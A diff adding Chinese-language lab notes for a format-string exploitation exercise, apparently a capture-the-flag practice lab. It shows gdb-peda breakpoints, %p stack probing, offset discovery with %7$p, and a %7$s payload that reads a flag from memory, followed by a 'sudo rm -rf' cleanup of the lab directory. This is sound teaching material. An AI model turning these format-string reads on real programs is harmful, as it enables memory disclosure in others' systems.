@@ -125,3 +125,34 @@ Start              End                Perm      Name
 # 寫程式
 ```
 
+## Lab 4, [practice] format
+
+## Lab 5,
+
+```
+# 假資料
+sudo mkdir /home/cr4ck ; sudo vim /home/cr4ck/flag
+
+# 先斷在有問題的format string
+0x0000000000400712 <+171>:   call   0x400520 <printf@plt>
+gdb-peda$ b *0x0000000000400712
+
+# 先輸入 %p 觀察
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdc70 --> 0xa7025 ('%p\n')
+# 64bits第七個參數開始是用stack傳遞，前面參數是用register
+
+# 重run 輸入 %7$pAAAABBBBBBBB，8 bytes一組
+ni
+# 印出的內容：0x4242424242424242AAAABBBBBBBB
+# 的確會印出：0x4242424242424242(BBBBBBBB)
+
+# 定位出flag位址
+gdb-peda$ x/x &flag
+0x600ba0 <flag>:        0x0000000a47414c46
+
+# 寫程式囉，送出%7$sAAAA<flag> 就會印出flag位址中的字串
+
+# 用完刪掉
+sudo rm -rf /home/cr4ck/
+```
